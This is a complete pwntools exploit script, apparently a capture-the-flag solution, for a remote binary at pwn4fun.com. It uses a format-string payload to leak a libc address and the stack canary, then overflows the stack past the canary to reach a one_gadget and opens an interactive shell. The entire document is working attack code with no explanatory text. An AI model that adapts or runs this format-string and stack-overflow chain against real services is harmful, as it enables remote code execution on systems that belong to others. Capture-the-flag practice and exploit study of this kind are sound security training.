#! /usr/bin/python

from pwn import *
from LibcSearcher import *

#p = process('./pwn')
p = remote('pwn4fun.com','9091')
elf = ELF('./pwn')
context.log_level='debug'



###leak canary&&libc###
stdout = 0x6040D8

p.sendlineafter('Please enter','1')
p.sendlineafter('Please enter','1')
p.sendlineafter('Would you like','2')

payload='%8$s@@@@'+'%17$lx@@'+p64(stdout)
p.recvuntil('me know:\n')
p.sendline(payload)


p.recvuntil('Ok,we ge it.\n')
stdout = u64(p.recv(6).ljust(8,'\x00'))
libc = LibcSearcher('_IO_2_1_stdout_',stdout)
libc_base = stdout - libc.dump('_IO_2_1_stdout_')
log.success('libc:'+hex(libc_base))


p.recvuntil('@@@@')
canary = int(p.recv(16),16)
log.success('Canary:'+hex(canary))

###stackoverflow to ret2onegadget###
offset = 0x60
one_gadget = libc_base+0x45216
p.recvuntil('Now ,if there are any bugs, please let me know:\n')
payload = 'A' * (offset-8) + p64(canary) + 'deadbeef' + p64(one_gadget)
p.sendline(payload)

###get shell###
p.interactive()